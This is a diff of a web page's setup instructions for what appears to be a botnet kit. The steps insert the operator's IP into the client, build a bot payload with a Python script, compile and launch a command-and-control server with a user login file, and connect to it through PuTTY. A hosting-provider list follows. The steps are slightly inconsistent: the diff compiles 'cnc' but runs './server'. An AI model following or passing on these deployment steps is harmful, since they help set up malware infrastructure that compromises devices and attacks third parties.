@@ -16,17 +16,17 @@
 
 1. sudo apt install python2 python3 screen gcc nano perl
 2. go to client and replace all "IPHERE"'s to your IP
-3. python2 cc7.py client.c (ip)
+3. python2 cc9.py bot.c (ip)
 4. Save your payload
-5. gcc server.c -o server -pthread
+5. gcc cnc.c -o cnc -pthread
 6. nano login.txt (username password role mm/dd/yy)
-7. screen ./server 23 1000 (port)
-8. sudo ./server 23 1000 (port) (If step 7 doesn't work)</pre></code>
+7. screen ./server 89 1000 (port)
+8. sudo screen ./server 89 1000 (port) (If step 7 doesn't work)
+9. Connect you your server via Raw in putty</pre></code>
    <div>
 
 <div>
   <h2>Recommended Hosting</h2><lu>
-  <li><a href="https://sacred.sbs/">Sacred Hosting</a>
   <li><a href="https://www.cloudways.com/en/">Cloudways</a>
   <li><a href="https://crazyrdp.com/linux-vps-hosting/">CrazyRDP</a>
     <div>
